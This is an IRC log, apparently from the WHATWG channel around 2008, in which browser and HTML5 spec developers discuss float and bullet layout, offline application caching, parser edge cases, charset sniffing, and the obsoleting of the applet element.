except float-displace isn't indenting the line, so the bullet overlaps the float

[20:15:01.0000] <dbaron>
Starting from the beginning, what other browsers do is position the bullet relative to the first line box of the block.

[20:15:02.0000] <dbaron>
or the place that said line box would start if there were one

[20:16:00.0000] <dbaron>
that line box is flush against the float

[20:16:01.0000] <dbaron>
/me looks for a testcase

[20:16:02.0000] <Hixie>
i guess i don't understand how that differs from float-displace, given the right values of float-displace

[20:17:00.0000] <dbaron>
https://bugzilla.mozilla.org/attachment.cgi?id=302070

[20:17:01.0000] <dbaron>
it's like everybody's doing the right thing, except without setting float-displace:line on list items

[20:17:02.0000] <dbaron>
which means if we become consistent

[20:17:03.0000] <dbaron>
we'll never be able to change that default

[20:17:04.0000] <dbaron>
whereas now Mozilla is doing something that means float-displace:line would be a compromise between existing browsers

[20:18:00.0000] <dbaron>
so people could move to that default

[20:19:00.0000] <Hixie>
i have to admit finding it difficult to really care :-)

[20:19:01.0000] <Hixie>
i think we should introduce float-displace and the other property

[20:19:02.0000] <dbaron>
well, float-displace as specced is rather broken

[20:19:03.0000] <dbaron>
but it's easily fixable

[20:19:04.0000] <Hixie>
but i've given up trying to make bert and fantasai see reason, so i'm not planning on trying to get any work done in the csswg any time soon

[20:20:00.0000] <dbaron>
ok, I guess I'll back out my patch

[20:20:01.0000] <Hixie>
what did your patch do?

[20:20:02.0000] <dbaron>
or most of it, anyway

[20:20:03.0000] <dbaron>
it made Mozilla match the behavior of other browsers

[20:20:04.0000] <dbaron>
where the bullets overlap the float

[20:20:05.0000] <dbaron>
but we don't move blocks

[20:22:00.0000] <Hixie>
isn't that one of the values of float-displace and company?

[20:22:01.0000] <dbaron>
moving blocks is, but it really sucks

[20:22:02.0000] <dbaron>
I think we want to get rid of it, except for things that introduce new BFCs

[20:22:03.0000] <dbaron>
where it would be the default

[20:23:00.0000] <Hixie>
so what's wrong with the behaviour of other browsers?

[20:23:01.0000] <dbaron>
bullets overlap floats

[20:23:02.0000] <dbaron>
pretty much any time they're next to floats

[20:30:00.0000] <Hixie>
hm

[20:30:01.0000] <Hixie>
that does suck

[20:30:02.0000] <dbaron>
So I don't think I have a good excuse for implementing float-displace this far after feature freeze.

[20:31:00.0000] <dbaron>
But I think I can leave most of what I fixed in.

[20:31:01.0000] <Hixie>
yeah

[20:42:00.0000] <dbaron>
but still back out the change removing -moz-float-edge: margin-box from li

[21:14:00.0000] <dbaron>
Hixie, actually, backing out doesn't yield as good behavior as I thought it did.

[21:14:01.0000] <dbaron>
Hixie, we had -moz-float-edge on the wrong element, essentially, so we overlapped the bullets too.

[21:14:02.0000] <dbaron>
Hixie, so we're probably stuck with it...

[21:15:00.0000] <dbaron>
Hixie, although I'd consider implementing float-displace and seeing what breaks

[21:47:00.0000] <dbaron>
Hixie, and I think bug 57882 was your fault, too :-P

[21:49:00.0000] <MikeSmith>
hendry - ping me when you are back on

[21:51:00.0000] <Hixie>
dbaron: oh?

[21:51:01.0000] <dbaron>
Hixie, moving -moz-float-edge from ul,ol to li in your html.css cleanup

[21:51:02.0000] <dbaron>
Hixie, when I wanted to back out, I was thinking our use of -moz-float-edge prevented bug 57882 and I had caused it

[21:51:03.0000] <dbaron>
Hixie, but we had it all along, so I think what I did is an improvement

[21:52:00.0000] <dbaron>
anyway, enough confusing myself for today.

[21:57:00.0000] <Hixie>
heh

[22:52:00.0000] <Hixie>
i have no idea how to find examples of what julian is saying doesn't happen

[00:22:00.0000] <Hixie>
roc: yt?

[00:23:00.0000] <roc>
aye

[00:23:01.0000] <Hixie>
i'm looking at your application cache feedback, in particular your use case for a map application wanting to pick a tile that is known to be available locally as the starting point of a transition

[00:23:02.0000] <Hixie>
is this something you think we should resolve in v1 of the api?

[00:24:00.0000] <Hixie>
or something for the future?

[00:25:00.0000] <roc>
I don't have an opinion on that

[00:25:01.0000] <roc>
I know people have asked for it

[00:25:02.0000] <roc>
Google Maps people

[00:25:03.0000] <roc>
I don't know how to prioritize these things

[00:25:04.0000] <Hixie>
k

[00:28:00.0000] <Hixie>
roc: let me know if you end up pressured to implement something for that use case and i'll bring it up, but for now i'm going to shunt that to v2.

[00:28:01.0000] <Hixie>
roc: i want to try and get the basic API nailed down first.

[00:29:00.0000] <roc>
sounds reasonable

[00:29:01.0000] <roc>
we did actually implement something

[00:29:02.0000] <roc>
should we take it out?

[00:29:03.0000] <roc>
http://mxr.mozilla.org/seamonkey/search?string=islocallyavailable

[00:30:00.0000] <Hixie>
/me looks

[00:31:00.0000] <Hixie>
lordy, nsGlobalWindow is trying to catch up to nsCSSFrameConstructor

[00:31:01.0000] <roc>
don't look there

[00:36:00.0000] <Hixie>
well, i would rename it mozIsLocallyAvailable

[00:37:00.0000] <Hixie>
in case we introduce it later with different semantics or something

[00:37:01.0000] <Hixie>
but no, don't remove it, it'd be good to find out how people use it

[00:37:02.0000] <Hixie>
implementation feedback is a great way to inform the spec

[00:38:00.0000] <roc>
ok

[00:39:00.0000] <roc>
you know we're actually shipping supposedly-HTML5-complaint offline-application support in FF3

[00:39:01.0000] <Hixie>
really? sweet

[00:40:00.0000] <Hixie>
is that implemented yet?

[00:40:01.0000] <roc>
yeah

[00:40:02.0000] <roc>
yeah it is

[00:40:03.0000] <Hixie>
wow, cool

[00:40:04.0000] <Hixie>
didn't hear any feedback from whoever implemented it, as far as i recall; i hope the spec was clear enough

[00:40:05.0000] <roc>
If you have a recent FF3 build, check out "Tools ... Clear Private Data"

[00:40:06.0000] <Hixie>
Offline Website Data?

[00:40:07.0000] <Hixie>
cool

[00:40:08.0000] <roc>
yeah

[00:41:00.0000] <Hixie>
i guess i should test it :-)

[00:41:01.0000] <roc>
that would be interesting :-)

[00:42:00.0000] <roc>
/me is busy testing SVG filters :-(

[00:58:00.0000] <Hixie>
i've already found two bugs

[00:58:01.0000] <Hixie>
and i've only written five lines of code

[01:25:00.0000] <Hixie>
http://www.hixie.ch/tests/adhoc/html/offline/

[01:25:01.0000] <Hixie>
firefox fails at least 003

[01:25:02.0000] <Hixie>
bed time now

[01:38:00.0000] <hsivonen>
any opinion whether Validator.nu TLS cert handling should copy trusted certificates from e.g. Mozilla or just skip trust checking?

[01:55:00.0000] <Philip`>
hsivonen: Maybe it would be useful if the validator trusted the intersection of what's trusted by each major browser, so it can tell you if some fraction of users will experience problems

[01:57:00.0000] <Philip`>
but I'd expect it really needs some way to validate pages that are behind untrusted certificates, because people might do that intentionally (and ask users to accept or install the certificate) and will still want to validate their pages

[01:58:00.0000] <hsivonen>
Philip`: yeah, given the current state of HttpClient, it is hard to have it both ways

[01:58:01.0000] <hsivonen>
Philip`: and having yet another checkbox would suck

[01:59:00.0000] <hsivonen>
I've tried to find a way to manage HttpClient cert trust on a per HttpClient instance or on a per request basis

[02:00:00.0000] <hsivonen>
but it seems that it can only be managed on a per-classloader basis, which is rather bad in case someone wants to run the validator servlet in a larger app server

[02:00:01.0000] <hsivonen>
Philip`: as for the intersection, I can see practical reasons to to the intersection thing

[02:02:00.0000] <hsivonen>
Philip`: I can also don't like the inherent problem of root trust-based trust management that blesses a relatively small number of gatekeepers who can extract money from anyone who wishes to do TLS in a user-friendly way

[02:23:00.0000] <hsivonen>
http://html5.validator.nu/?doc=https%3A%2F%2Flabs.mozilla.com%2Fforum%2F

[02:23:01.0000] <hsivonen>
validator.nu is now totally promiscuous when it comes to cert checking

[02:30:00.0000] <annevk>
"On Sat, 13 Nov 2004, Henri Sivonen wrote:" heh

[02:30:01.0000] <annevk>
fortunately comments are not addressed in chronological order

[02:58:00.0000] <hsivonen>
hmm. the French Wikipedia says that its XHTML article is part of a series on programming languages...

[03:26:00.0000] <annevk>
so defaultChecked does change the checked state in browsers, but only if it was not changed before

[03:42:00.0000] <annevk>
oh, defaultChecked is actually more weird than that

[03:42:01.0000] <annevk>
:(

[03:44:00.0000] <annevk>
Firefox makes a distinction between setAttribute("checked", "checked") and defaultChecked

[03:54:00.0000] <annevk>
Hixie, either Acid3 should test a bunch of other things regarding defaultChecked so that we can extract a sane spec/impl out of it. If not it should simply avoid it so we won't be constrained further on

[03:56:00.0000] <annevk>
to the people doing dom5: kill hasFeature

[03:56:01.0000] <annevk>
(and friends)

[04:05:00.0000] <Philip`>
/me begins to suspect that http://james.html5.org/cgi-bin/parsetree/parsetree.py?uri=http://philip.html5.org/misc/fostered-adoption-3.html is a bug in html5lib, because it should be impossible to append the p to the table element

[04:06:00.0000] <hsivonen>
Philip`: http://parsetree.validator.nu/?doc=http://philip.html5.org/misc/fostered-adoption-3.html

[04:07:00.0000] <hsivonen>
Philip`: looks like two independent implementations share the bug...

[04:08:00.0000] <annevk>
yaiks

[04:08:01.0000] <annevk>
Firefox does move the <p><b> thingie before <table>

[04:11:00.0000] <annevk>
probably time for revising the parser section

[04:38:00.0000] <Philip`>
annevk: I'm not sure the spec is wrong here

[04:40:00.0000] <annevk>
those two statements were not tightly related :)

[04:40:01.0000] <annevk>
sorry

[04:46:00.0000] <Philip`>
Ah, okay :-)

[05:13:00.0000] <Philip`>
Oh, looks like html5lib/validator.nu are correct, and the spec is wrong

[05:14:00.0000] <annevk>
my main issue with spec changes at this point is fixing html5lib

[05:14:01.0000] <annevk>
i hope someone will add more parsing tests based on the updated spec and that we can then sort of figure out what needs to happen

[05:49:00.0000] <Philip`>
Hmm, Gmail's sponsored links aren't entirely appropriate when reading email about the foster parenting algorithm

[06:05:00.0000] <annevk>
latest rumors: Y! to merge with AOL, Y! to form alliances with Google/Disney

[06:05:01.0000] <hsivonen>
Hixie: do you have feedback on text/html encoding sniffing from browser vendors? is the current spec language considered virtually final?

[06:09:00.0000] <Philip`>
Mozilla should buy Yahoo

[06:09:01.0000] <annevk>
heh, that'd be something

[06:10:00.0000] <Philip`>
using money secretly donated by Google

[06:10:01.0000] <annevk>
hsivonen, I doubt it had much review...

[06:10:02.0000] <hsivonen>
annevk: ok.

[06:10:03.0000] <hsivonen>
I won't implement it now then

[06:11:00.0000] <hsivonen>
I've already written one tentative implementation, so now it's someone else's turn :-)

[06:11:01.0000] <hsivonen>
"The attribute value must be serialised without the use of character entity references of any kind. " fun, fun, fun

[06:11:02.0000] <hsivonen>
go layering

[06:13:00.0000] <annevk>
that's actually pretty complex if you don't encounter it in the prescan

[06:13:01.0000] <annevk>
and since there's no longer a max bytes limit...

[06:14:00.0000] <hsivonen>
Hixie: why are entities prohibited if the algorithm now involves running the real tokenizer?

[06:15:00.0000] <Philip`>
http://james.html5.org/cgi-bin/parsetree/parsetree.py?source=<table><b><p></b> - hmm, EOF should cause an implied </p> which should get foster-parented which should result in one more parse error than is shown

[06:15:01.0000] <hsivonen>
} else if ("meta" == name) { // XXX do charset stuff

[06:15:02.0000] <hsivonen>
that explains why the parser wasn't doing what Sam Ruby suggested

[06:16:00.0000] <hsivonen>
although I though it already did...

[06:16:01.0000] <Philip`>
/me wonders if it would be bad to commit evil tests to html5lib without offering to fix the code to pass them

[06:16:02.0000] <annevk>
yes

[06:17:00.0000] <hsivonen>
Philip`: I suggest putting evil tests to a separate test file

[06:17:01.0000] <annevk>
we still need to organize all those tests one day

[06:17:02.0000] <annevk>
but maybe we should wait for the spec to update itself first

[06:18:00.0000] <gsnedders>
the spec updates itself? oh,

[06:18:01.0000] <gsnedders>
I thought Hixie did the updating.

[06:18:02.0000] <hsivonen>
does the spec say anywhere that it is an error for HTTP charset and meta charset to disagree?

[06:18:03.0000] <gsnedders>
</bad_joke>

[06:20:00.0000] <gsnedders>
hsivonen: as far as I can see, no

[06:20:01.0000] <hsivonen>
gsnedders: ok

[06:35:00.0000] <Philip`>
Hmm, I assume that <table><td><a><table></table> shouldn't give a stack overflow

[06:36:00.0000] <hsivonen>
Philip`: does it somewhere?

[06:37:00.0000] <Philip`>
It does in my implementation

[06:38:00.0000] <Philip`>
Actually, that <a> is unnecessary

[06:41:00.0000] <Philip`>
Ah, it's just my ReprocessAsIf being broken if the insertion mode changes while reprocessing...

[06:52:00.0000] <Philip`>
...which seems impossible to solve without adding even more state variables :-(

[07:19:00.0000] <annevk>
http://en.wikipedia.org/wiki/Acid3

[07:29:00.0000] <Lachy>
wow, webkit has improved a lot in acid3 over the last few weeks

[07:33:00.0000] <krijnh>
Are there IE8 previews somewhere already? :)

[07:36:00.0000] <alp>
sigh, we still get data url parsing wrong :-(

[07:37:00.0000] <gsnedders>
alp: "we"?

[07:37:01.0000] <alp>
WebKit, GTK+ port

[07:39:00.0000] <alp>
is there a published algorithm? maybe that's going to work better than my interpretation of the RFC

[07:47:00.0000] <Lachy>
krijnh, not yet

[07:47:01.0000] <krijnh>
Bummer

[07:47:02.0000] <Lachy>
krijnh, the IE blog will most likely annonce it when there are

[07:48:00.0000] <krijnh>
Would be cool to see how it's doing now

[07:49:00.0000] <hsivonen>
hmm. Gecko and WebKit don't require http-equiv='content-type' to sniff charset

[07:49:01.0000] <hsivonen>
it seems that Opera 9.5 and IE7 do

[07:49:02.0000] <hsivonen>
http://browsershots.org/screenshots/63d26493fb4be33bb27db91ac31fd9a1/

[07:49:03.0000] <hsivonen>
yay for interop

[08:00:00.0000] <alp>
gsnedders: it turned out i was using a base64 decoder special-cased for window.atob(). using a generalised base64 decoder fixed acid3 test 97

[08:00:01.0000] <gsnedders>
ah.

[08:01:00.0000] <alp>
webkit's special-case b64 decoder needs a better name than base64Decode() clearly

[08:13:00.0000] <gsnedders>
/me wonders if anyone who knows XPath is around

[08:18:00.0000] <gsnedders>
Is there anyway to find any comment node in the document with the content, "foobar"?

[08:19:00.0000] <annevk>
http://www.w3.org/TR/xpath

[08:19:01.0000] <Philip`>
I'd use grep

[08:20:00.0000] <gsnedders>
annevk: Reading the spec (actually, 2.0, not 1.0) makes me think no

[08:20:01.0000] <gsnedders>
Philip`: does that work on trees? :P

[08:20:02.0000] <gsnedders>
(i.e., I can't use grep)

[08:21:00.0000] <Philip`>
Serialise the tree then use grep

[08:21:01.0000] <gsnedders>
Philip`: I really don't want to be playing around with HTML with grep. HTML is too mad :)

[08:21:02.0000] <annevk>
something like //comment() plus something else might work

[08:22:00.0000] <Philip`>
Serialise the tree to XML then use grep

[08:22:01.0000] <gsnedders>
Philip`: too much serialising and parsing :)

[08:23:00.0000] <gsnedders>
annevk: seems to work in Safari (though that only claims to support 1.0), so I guess the Python impl I'm using is broken

[08:23:01.0000] <gsnedders>
/me dives back into Python

[08:23:02.0000] <Philip`>
It sounds like you have determined the limit of "too much" totally arbitrarily just so you can reject my idea :'-(

[08:25:00.0000] <gsnedders>
Philip`: 2MB documents + Python = Slow enough all ready

[08:25:01.0000] <gsnedders>
Philip`: and seeming a stated aim of the spec-gen clone is to be quicker than the official one (which is written in Perl, sed, and C), parsing it too many times will make it too slow

[08:26:00.0000] <gsnedders>
(the real reason why the spec-gen is so slow is that it parses _loads_ of times)

[08:26:01.0000] <annevk>
from skimming the XPath spec it should be possible

[08:26:02.0000] <gsnedders>
annevk: that's what I think, too

[08:26:03.0000] <gsnedders>
I think I've just hit a bug in my very new Python impl

[08:26:04.0000] <gsnedders>
(well, not my impl, but the one I'm using)

[08:56:00.0000] <Philip`>
Hooray, more text issues

[08:57:00.0000] <Philip`>
html5lib says <!DOCTYPE HTML><frameset>test should only create one parse error for the text, but the spec unambiguously requires each character token to generate an individual parse error

[09:01:00.0000] <jruderman>
conclusion: "test" is a single character

[09:02:00.0000] <SadEagle>
or a single "character" token? :-)

[09:02:01.0000] <Philip`>
Perhaps it's a single Multicode character

[09:03:00.0000] <Philip`>
SadEagle: A single character token contains a single character

[09:03:01.0000] <Philip`>
(except in the reality of implementations)

[09:03:02.0000] <hsivonen>
Philip`: IIRC, Hixie said that in principle you should be able to treat runs of characters as units

[09:03:03.0000] <hsivonen>
Philip`: but the foster parenting stuff breaks that

[09:03:04.0000] <hsivonen>
what WebKit does is most sane IMO

[09:03:05.0000] <hsivonen>
what Gecko does seems unnecessarily complex

[09:04:00.0000] <Philip`>
Even without foster parenting, whitespace breaks that

[09:04:01.0000] <hsivonen>
Philip`: where?

[09:05:00.0000] <hsivonen>
(I'm assuming that the frameset case above isn't *really* mean to spew an error on each char separately)

[09:05:01.0000] <annevk>
hixie also mentioned that parse errors may be collapsed

[09:05:02.0000] <annevk>
no idea if that's reflected by the spec

[09:06:00.0000] <hsivonen>
Philip`: fwiw, the cases where html5lib and V.nu disagree on the exact # of tree construction errors, either one is just collapsing errors that would be guaranteed to fire together

[09:06:01.0000] <hsivonen>
Philip`: it didn't make sense to follow html5lib exactly, because IIRC, html5lib didn't follow the spec 100%, either

[09:06:02.0000] <Philip`>
With something like "<frameset>    test" the spec says the whitespace and non-whitespace characters are handled through different paths, so you have to handle characters individually or split the text run up into whitespace and non-whitespace runs or think cleverly about how to make it work regardless

[09:07:00.0000] <hsivonen>
oh, right.

[09:07:01.0000] <hsivonen>
you can only coalesce runs of whitespace and runs of non-whitespace

[09:08:00.0000] <Philip`>
It'd be inefficient to not coalesce combined whitespace-and-not characters in the common cases of big paragraphs of un-marked-up text

[09:08:01.0000] <hsivonen>
the trick case that shows WebKit vs. Gecko difference is when you have: <table>foo<!-- --> <!-- --> bar</table>, IIRC

[09:08:02.0000] <hsivonen>
Philip`: yeah

[09:09:00.0000] <hsivonen>
from the impl point of view I like what WebKit does: coalesce a run first and then check if it is all whitespace

[09:09:01.0000] <hsivonen>
which is why the crafter comment case tricks WebKit

[09:09:02.0000] <hsivonen>
crafted

[09:09:03.0000] <Philip`>
What if you want to do incremental display, and add Text nodes to the document before you've finished tokenising a run of characters?

[09:10:00.0000] <hsivonen>
Philip`: you'd assume that no single text run on normal pages is long enough without intervening markup to justify rendering a run of text incrementally

[09:10:01.0000] <SadEagle>
1) how common is the case of a long run of characters w/o whitespace?  2) you can always update TextNodes, as long as you don't let JS run prematurely, anyway

[09:12:00.0000] <Philip`>
"<plaintext>5MB of text from Gutenberg"

[09:13:00.0000] <SadEagle>
that has whitespace, no? 

[09:13:01.0000] <gsnedders>
SadEagle: that has no whitespace

[09:14:00.0000] <Philip`>
SadEagle: 2) The difficult is that you'd have to move the Text node from inside the table to outside, once you've discovered a non-whitespace character at the end

[09:14:01.0000] <Dashiva>
Maybe stating the definition would help the discussion :)

[09:15:00.0000] <Philip`>
SadEagle: 1) I'm assuming whitespace in the middle of a run of characters is coalesced with non-whitespace, because it seems inefficient otherwise

[09:15:01.0000] <SadEagle>
Philip`: ah, and you mean the rendering might "jump" due to the node movement?

[09:16:00.0000] <Philip`>
I mostly mean that the node movement is kind of complex and likely to include bugs :-)

[09:16:01.0000] <SadEagle>
what does the 5mb matter then? :-)

[09:17:00.0000] <zcorpan>
justify incremental rendering?

[09:18:00.0000] <SadEagle>
ah :-). Well, never mind me, I am dumb when 90% of my brain is dedicated to something else </lameexcuse>

[09:19:00.0000] <Philip`>
parse error: unmatched closing tag lameexcuse

[09:21:00.0000] <Philip`>
Grargh, I'm adopting children backwards

[12:56:00.0000] <hsivonen>
http://vesa.piittinen.name/doctype/

[13:14:00.0000] <krijnh>
Doesn't really work in Opera..

[13:16:00.0000] <annevk>
works in Opera 9.5 I think

[13:17:00.0000] <annevk>
string based apps and XML always go wrong: http://vesa.piittinen.name/doctype/?doctype=%3C%21DOCTYPE+html+PUBLIC+%22-%2F%2FWAPFORUM%2F%2FDTD+WML+2.0%2F%2FEN%22+%22http%3A%2F%2Fwww.wapforum.org%2FDTD%2Fwml20.dtd%22%3E&content-type=text%2Fxml

[13:18:00.0000] <annevk>
seems he never tested the XML stuff him/herself...

[13:18:01.0000] <gsnedders>
annevk: XML is easy. Don't you know? :)

[13:21:00.0000] <annevk>
better than you :p

[13:22:00.0000] <gsnedders>
Hey! My brain is a non-fatal XML parser! It's easy!

[13:25:00.0000] <SadEagle>
how well does it support external entities? :-)

[13:25:01.0000] <gsnedders>
SadEagle: it ignores them

[13:26:00.0000] <gsnedders>
(the built-in memory is too restrictive, as it would cause a segfault)

[13:33:00.0000] <Dashiva>
gsnedders: So it's non-validating?

[13:34:00.0000] <gsnedders>
Dashiva: totally.

[13:34:01.0000] <gsnedders>
Dashiva: it totally ignores all errors, so why bother using a validating parser? It just complicates matters by needing to get external entities!

[13:37:00.0000] <Dashiva>
Well, even if you ignore errors you might want to keep track of them, so you don't propagate them onto other, validating parsers ;)

[13:43:00.0000] <zcorpan_>
gsnedders: how about the internal subset?

[13:43:01.0000] <gsnedders>
zcorpan_: yeah, I parse that

[13:44:00.0000] <zcorpan_>
/me feeds the billion laughs attack to gsnedders' brain

[13:44:01.0000] <gsnedders>
/me notes recursion (at any level) and throws a "too lazy" error

[13:45:00.0000] <Philip`>
/me passes a U+2664 SPADE through gsnedders' head

[13:45:01.0000] <gsnedders>
/me shrugs

[13:45:02.0000] <Dashiva>
Surely it would be better to use U+FDD0 before the joke gets too old

[13:47:00.0000] <gsnedders>
oh gwad/.

[13:47:01.0000] <gsnedders>
I actually looked that up.

[13:47:02.0000] <gsnedders>
I'm that willing to believe a comic!

[13:48:00.0000] <gsnedders>
brb

[14:51:00.0000] <Hixie>
hsivonen: the html5 spec requires that the content type declarations match the encoding used

[14:52:00.0000] <Hixie>
hsivonen: so that's one way you could justify mismatched declarations as being an error

[14:57:00.0000] <hsivonen>
Hixie: ok. thanks. It could be clearer, though.

[14:58:00.0000] <Hixie>
yeah

[15:00:00.0000] <webben>
are there any test-cases for cross-browser syntax for embedding Java applets without applet that don't rely on conditional comments?

[15:01:00.0000] <webben>
(or alternately, any good description of why the draft currently obsoletes applet?)

[15:01:01.0000] <annevk>
we need someone to figure out how <applet> works, last i checked

[15:02:00.0000] <Philip`>
The problem with <applet> is that it's a vendor-prefixed name

[15:02:01.0000] <hsivonen>
hah

[15:02:02.0000] <webben>
/me isn't sure what that means

[15:02:03.0000] <Hixie>
that's funny

[15:04:00.0000] <webben>
not having worked out how something works doesn't sound like a rationale for obsoleting it.

[15:04:01.0000] <annevk>
html5 isn't done

[15:05:00.0000] <webben>
I don't really see how it's un-doneness is relevant. People are being asked to look at a series of draft documents.

[15:05:01.0000] <annevk>
can't help you there

[15:06:00.0000] <webben>
if something is simply un-thought-out, it's better to mark it as such

[15:06:01.0000] <hsivonen>
annevk: is there a reason to expect that how <applet> really works is significantly more complex than what Sun documents?

[15:06:02.0000] <Philip`>
It might be helpful to add a placeholder section that just says we don't quite know what should be done yet, to avoid misleading people that it's been intentionally removed

[15:06:03.0000] <Philip`>
Oh, like what webben said

[15:07:00.0000] <webben>
or alternately, don't publish official drafts

[15:07:01.0000] <annevk>
webben, you're overreacting

[15:08:00.0000] <annevk>
hsivonen, dunno

[15:08:01.0000] <Hixie>
i have no intention of adding <applet> to the spec, btw

[15:08:02.0000] <Hixie>
<object> should be enough for any proprietary binary embedding, whether it's activex, java, sliverlight, or whatever.

[15:09:00.0000] <webben>
you mean object plus conditional comments?

[15:09:01.0000] <annevk>
conditional comments are not part of html5

[15:10:00.0000] <gsnedders>
if anyone wants to do something minor to help the spec-gen clone, can they get Py html5lib's dom treebuilder/walker to work with other dom implementations (i.e., not minidom, I need pxdom). I looked through it very quickly earlier and it really looks like next to no work.

[15:10:01.0000] <Hixie>
why conditional comments?

[15:10:02.0000] <webben>
Hixie: to get markup that works in IE too?

[15:10:03.0000] <gsnedders>
Also, on the subject of the spec-gen clone, I hope to get something working over my half-term (this Wednesday to Sunday).

[15:11:00.0000] <Hixie>
webben: IE doesn't support java in <object>?

[15:12:00.0000] <hsivonen>
Hixie: what's in the spec now doesn't cover activex

[15:12:01.0000] <hsivonen>
Hixie: by the time HTML5 is done, Java will be non-proprietary

[15:12:02.0000] <webben>
Hixie: AFAIK, you need conditional comments if you want both non-IE and IE to work with OBJECT + Java. I was hoping the idea of deprecating APPLET was prefaced on test cases showing that somehow this wasn't necessary.

[15:13:00.0000] <Hixie>
hsivonen: in the same way that open office is non-proprietary?

[15:13:01.0000] <hsivonen>
Hixie: in the way that you can get a Free Software impl

[15:13:02.0000] <Hixie>
webben: no, the obsoletion of applet is based purely on my prejudices.

[15:14:00.0000] <Hixie>
hsivonen: "proprietary" may be hte wrong term here.

[15:14:01.0000] <Philip`>
/me noticed recently that the spec changed from section numbers like "1.2.3." to "1.2.3", and wonders if that's an artifact of the spec-gen script

[15:14:02.0000] <gsnedders>
webben: HTML 5 is being developed from a clean slate, so everything has made it's way in it through use cases being presented, and not the other way around

[15:14:03.0000] <gsnedders>
Philip`: yeah, that's all spec-gen

[15:14:04.0000] <Hixie>
Philip`: no idea, i didn't even notice that

[15:14:05.0000] <gsnedders>
Hixie: I've seen that elsewhere too

[15:15:00.0000] <Philip`>
http://lists.whatwg.org/pipermail/commit-watchers-whatwg.org/2008/000397.html

[15:15:01.0000] <gsnedders>
<http://www.w3.org/Tools/HTML-XML-utils/> — 4.4 update

[15:15:02.0000] <Hixie>
wow, i wonder what caused that

[15:15:03.0000] <gsnedders>
(a lot of the spec-gen is just calling those utils, all of which parse the HTML themselves then serialise it, which makes it that dog slow)

[15:15:04.0000] <annevk>
Philip`, Bert changed his tool, yes

[15:16:00.0000] <hsivonen>
what parser does the script use?

[15:16:01.0000] <webben>
The drafts don't dispute that applet has a /use/.

[15:16:02.0000] <gsnedders>
num(1), specially

[15:16:03.0000] <webben>
They claim it's unnecessary for its use.

[15:16:04.0000] <Philip`>
http://lists.w3.org/Archives/Public/www-html-editor/2005JulSep/0003.html - the non-dot form is apparently an ISO standard

[15:16:05.0000] <gsnedders>
hsivonen: very naïve ones. download the source and look, it's really basic custom stuff

[15:16:06.0000] <webben>
"The following elements are not included because they have not been used often, created confusion or can be handled by other elements: .... applet has been obsoleted in favor of object."

[15:16:07.0000] <jgraham>
gsnedders: Are you really sure you want to use DOM? :)

[15:17:00.0000] <gsnedders>
jgraham: yes.

[15:17:01.0000] <jgraham>
why?

[15:17:02.0000] <Hixie>
webben: the only reason <applet> is not in html5 is my own personal prejudice against Java and my desire to not special-case one particular extension language.

[15:17:03.0000] <webben>
HTML5 already does special-case JS.

[15:18:00.0000] <Hixie>
webben: i would personally be quite happy to not support Java at all.

[15:18:01.0000] <Hixie>
webben: JS isn't an extension language for HTML, it's its scripting language.

[15:18:02.0000] <Hixie>
java is at the level of flash or silverlight

[15:18:03.0000] <gsnedders>
jgraham: all the decent XPath impls. require it, and not using XPath means recursing through the document manually, while changing it, even more times than otherwise needed

[15:18:04.0000] <gsnedders>
(by all the decent XPath impls., I basically mean WebPath)

[15:18:05.0000] <webben>
oh, I'm not sure "extension" is quite the word for such things.

[15:19:00.0000] <jgraham>
(btw I will be happy to support pyxdom or whatever in html5lib but I can't promise any time to look at it soon)

[15:19:01.0000] <hsivonen>
I have a strong prejudice against Java *applets*, but I still think that Java via <applet> is better than Java via <object>

[15:19:02.0000] <webben>
JS seems more like an "extension" of HTML.

[15:19:03.0000] <jgraham>
gsnedders: lxml

[15:19:04.0000] <Hixie>
webben: ok, well, whatever you want to call them :-)

[15:19:05.0000] <gsnedders>
jgraham: needs to be compiled to be used. I'd really like it to work without compiling anything.

[15:19:06.0000] <hsivonen>
Java applets might have been great if AWT didn't suck so incredibly badly

[15:20:00.0000] <jgraham>
Any reason for that requirement? easy_install lxml isn't so hard...

[15:20:01.0000] <gsnedders>
and there was some other reason why lxml wouldn't do.

[15:20:02.0000] <hsivonen>
webben: please raise the <applet> issue on public-html

[15:20:03.0000] <hsivonen>
nn

[15:20:04.0000] <gsnedders>
jgraham: I can't actually get it working locally.

[15:20:05.0000] <webben>
hsivonen: I'm not a member of the WG. (And I can't join either.)

[15:20:06.0000] <gsnedders>
(but that wasn't the reason, I admittedly didn't try hard)

[15:20:07.0000] <gsnedders>
webben: s/public-html/whatwg or public-html-comments/

[15:21:00.0000] <webben>
gsnedders: Yep, not at all clear to me I can safely post there either.

[15:21:01.0000] <gsnedders>
why?

[15:21:02.0000] <webben>
Indeed, just chatting here is a bit dodgy.

[15:21:03.0000] <Hixie>
webben: feel free to e-mail me directly ian⊙hc

[15:21:04.0000] <Hixie>
webben: i can keep any feedback confidential

[15:22:00.0000] <jgraham>
(actually if specgen requires comments before the html element our current lxml treebuilder won't work so well. Although it could be fixed I think)

[15:23:00.0000] <jgraham>
webben: that sucks (not being able to post feedback)

[15:23:01.0000] <webben>
gsnedders: Basically because of the way the W3C patent policy infects pretty much everything employees of member companies do.

[15:24:00.0000] <gsnedders>
jgraham: you should see what the real spec-gen does. it doesn't actually really parse it then serialise it, it just spits out everything until it finds something it wants to add/remove/change

[15:24:01.0000] <Hixie>
like i said, feel free to send me unofficial feedback straight to ian⊙hc

[15:24:02.0000] <Hixie>
it will never be made public

[15:24:03.0000] <jgraham>
webben: Can you say who your employer is?

[15:25:00.0000] <jgraham>
/me is just curious, it's not important

[15:25:01.0000] <gsnedders>
/me hasn't set about trying to break the spec-gen (because he don't have access), but it could be easily done

[15:25:02.0000] <annevk>
http://benjaminhawkeslewis.com/ suggests Y!

[15:26:00.0000] <webben>
that information is still accurate

[15:26:01.0000] <gsnedders>
/me wonders where he's seen webben before. rss-public? uf-*?

[15:26:02.0000] <roc>
maybe not for long, depending on how the takeover struggle goes :-)

[15:26:03.0000] <jgraham>
/me discovers that reading the specs properly in case the insane behaviour of one's code is actually correct and not a bug is a good idea

[15:26:04.0000] <webben>
roc: That I definitely can't comment on ;)

[15:27:00.0000] <roc>
:-)

[15:27:01.0000] <webben>
gsnedders: Oh, I used to post to whatwg quite a lot and often lurk/grumble in here.

[15:27:02.0000] <gsnedders>
ah

[15:28:00.0000] <webben>
(just to be 100% clear, nothing I say is an official Y! position, or a semi-official Y! position, or likely to be based on even talking to other Y! employees)

[15:29:00.0000] <webben>
gsnedders: I do post on the uf- mailing lists though, along with a couple other Y! folk.

[15:30:00.0000] <gsnedders>
webben: ah. I was sure I'd seen you elsewhere. I rarely post on the uf- lists, though I read quite a bit

